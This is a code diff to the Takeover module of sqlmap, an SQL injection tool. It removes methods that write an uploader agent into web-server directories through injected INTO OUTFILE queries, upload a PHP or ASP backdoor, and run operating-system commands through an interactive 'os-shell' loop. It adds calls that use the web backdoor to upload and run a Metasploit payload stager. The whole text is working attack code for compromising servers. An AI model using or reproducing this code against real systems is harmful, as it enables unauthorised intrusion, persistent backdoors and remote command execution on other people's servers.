@@ -57,176 +57,6 @@ class Takeover(Abstraction, Metasploit, Registry):
 
         Abstraction.__init__(self)
 
-    def __webBackdoorRunCmd(self, backdoorUrl, cmd):
-        output = None
-
-        if not cmd:
-            cmd = conf.osCmd
-
-        cmdUrl  = "%s?cmd=%s" % (backdoorUrl, cmd)
-        page, _ = Request.getPage(url=cmdUrl, direct=True)
-        output  = re.search("<pre>(.+?)</pre>", page, re.I | re.S)
-
-        if output:
-            print output.group(1)
-        else:
-            print "No output"
-
-        return output
-
-    def __webBackdoorShell(self, backdoorUrl):
-        infoMsg  = "calling OS shell. To quit type "
-        infoMsg += "'x' or 'q' and press ENTER"
-        logger.info(infoMsg)
-
-        autoCompletion(osShell=True)
-
-        while True:
-            command = None
-
-            try:
-                command = raw_input("os-shell> ")
-            except KeyboardInterrupt:
-                print
-                errMsg = "user aborted"
-                logger.error(errMsg)
-            except EOFError:
-                print
-                errMsg = "exit"
-                logger.error(errMsg)
-                break
-
-            if not command:
-                continue
-
-            if command.lower() in ( "x", "q", "exit", "quit" ):
-                break
-
-            self.__webBackdoorRunCmd(backdoorUrl, command)
-
-    def __webBackdoorInit(self):
-        """
-        This method is used to write a web backdoor (agent) on a writable
-        remote directory within the web server document root.
-        """
-
-        self.checkDbmsOs()
-
-        backdoorUrl = None
-        language    = None
-        kb.docRoot  = getDocRoot()
-        directories = getDirs()
-        directories = list(directories)
-        directories.sort()
-
-        infoMsg = "trying to upload the uploader agent"
-        logger.info(infoMsg)
-
-        message  = "which web application language does the web server "
-        message += "support?\n"
-        message += "[1] ASP\n"
-        message += "[2] PHP (default)\n"
-        message += "[3] JSP"
-
-        while True:
-            choice = readInput(message, default="2")
-
-            if not choice or choice == "2":
-                language = "php"
-                break
-
-            elif choice == "1":
-                language = "asp"
-                break
-
-            elif choice == "3":
-                errMsg  = "JSP web backdoor functionality is not yet "
-                errMsg += "implemented"
-                raise sqlmapUnsupportedDBMSException(errMsg)
-
-            elif not choice.isdigit():
-                logger.warn("invalid value, only digits are allowed")
-
-            elif int(choice) < 1 or int(choice) > 3:
-                logger.warn("invalid value, it must be 1 or 3")
-
-        backdoorName = "backdoor.%s" % language
-        backdoorPath = os.path.join(paths.SQLMAP_SHELL_PATH, backdoorName)
-        uploaderName = "uploader.%s" % language
-        uploaderStr  = fileToStr(os.path.join(paths.SQLMAP_SHELL_PATH, uploaderName))
-
-        for directory in directories:
-            # Upload the uploader agent
-            outFile     = os.path.normpath("%s/%s" % (directory, uploaderName))
-            uplQuery    = uploaderStr.replace("WRITABLE_DIR", directory)
-            query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
-            query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
-            query       = agent.prefixQuery(" %s" % query)
-            query       = agent.postfixQuery(query)
-            payload     = agent.payload(newValue=query)
-            page        = Request.queryPage(payload)
-
-            requestDir  = os.path.normpath(directory.replace(kb.docRoot, "/").replace("\\", "/"))
-            baseUrl     = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
-            uploaderUrl = "%s/%s" % (baseUrl, uploaderName)
-            uploaderUrl = uploaderUrl.replace("./", "/").replace("\\", "/")
-            uplPage, _  = Request.getPage(url=uploaderUrl, direct=True)
-
-            if "sqlmap backdoor uploader" not in uplPage:
-                warnMsg  = "unable to upload the uploader "
-                warnMsg += "agent on '%s'" % directory
-                logger.warn(warnMsg)
-
-                continue
-
-            infoMsg  = "the uploader agent has been successfully uploaded "
-            infoMsg += "on '%s'" % directory
-            logger.info(infoMsg)
-
-            # Upload the backdoor through the uploader agent
-            if language == "php":
-                multipartParams = {
-                                    "upload":    "1",
-                                    "file":      open(backdoorPath, "r"),
-                                    "uploadDir": directory,
-                                  }
-                page = Request.getPage(url=uploaderUrl, multipart=multipartParams)
-
-                if "Backdoor uploaded" not in page:
-                    warnMsg  = "unable to upload the backdoor through "
-                    warnMsg += "the uploader agent on '%s'" % directory
-                    logger.warn(warnMsg)
-
-                    continue
-
-            elif language == "asp":
-                backdoorRemotePath = "%s/%s" % (directory, backdoorName)
-                backdoorRemotePath = os.path.normpath(backdoorRemotePath)
-                backdoorContent = open(backdoorPath, "r").read()
-                postStr = "f=%s&d=%s" % (backdoorRemotePath, backdoorContent)
-                page, _ = Request.getPage(url=uploaderUrl, direct=True, post=postStr)
-
-                if "permission denied" in page.lower():
-                    warnMsg  = "unable to upload the backdoor through "
-                    warnMsg += "the uploader agent on '%s'" % directory
-                    logger.warn(warnMsg)
-
-                    continue
-
-            elif language == "jsp":
-                pass
-
-            backdoorUrl = "%s/%s" % (baseUrl, backdoorName)
-
-            infoMsg  = "the backdoor has probably been successfully "
-            infoMsg += "uploaded on '%s', go with your browser " % directory
-            infoMsg += "to '%s' and enjoy it!" % backdoorUrl
-            logger.info(infoMsg)
-
-            break
-
-        return backdoorUrl
-
     def uploadChurrasco(self):
         msg  = "do you want sqlmap to upload Churrasco and call the "
         msg += "Metasploit payload stager as its argument so that it "
@@ -250,14 +80,11 @@ class Takeover(Abstraction, Metasploit, Registry):
         stackedTest()
 
         if not kb.stackedTest:
-            infoMsg  = "going to upload a web page backdoor for command "
-            infoMsg += "execution"
+            infoMsg = "going to use a web backdoor for command execution"
             logger.info(infoMsg)
 
-            backdoorUrl = self.__webBackdoorInit()
-
-            if backdoorUrl:
-                self.__webBackdoorRunCmd(backdoorUrl, conf.osCmd)
+            self.webInit()
+            self.webBackdoorRunCmd(conf.osCmd)
         else:
             self.initEnv()
             self.runCmd(conf.osCmd)
@@ -266,14 +93,11 @@ class Takeover(Abstraction, Metasploit, Registry):
         stackedTest()
 
         if not kb.stackedTest:
-            infoMsg  = "going to upload a web page backdoor for command "
-            infoMsg += "execution"
+            infoMsg = "going to use a web backdoor for command prompt"
             logger.info(infoMsg)
 
-            backdoorUrl = self.__webBackdoorInit()
-
-            if backdoorUrl:
-                self.__webBackdoorShell(backdoorUrl)
+            self.webInit()
+            self.webBackdoorShell()
         else:
             self.initEnv()
             self.absOsShell()
@@ -282,6 +106,19 @@ class Takeover(Abstraction, Metasploit, Registry):
         stackedTest()
 
         if not kb.stackedTest:
+            infoMsg  = "going to use a web backdoor to execute the "
+            infoMsg += "payload stager"
+            logger.info(infoMsg)
+
+            self.webInit()
+
+            if self.webBackdoorUrl:
+                self.getRemoteTempPath()
+                self.createMsfPayloadStager()
+                self.uploadMsfPayloadStager(web=True)
+
+            self.pwn()
+
             return
 
         self.initEnv()
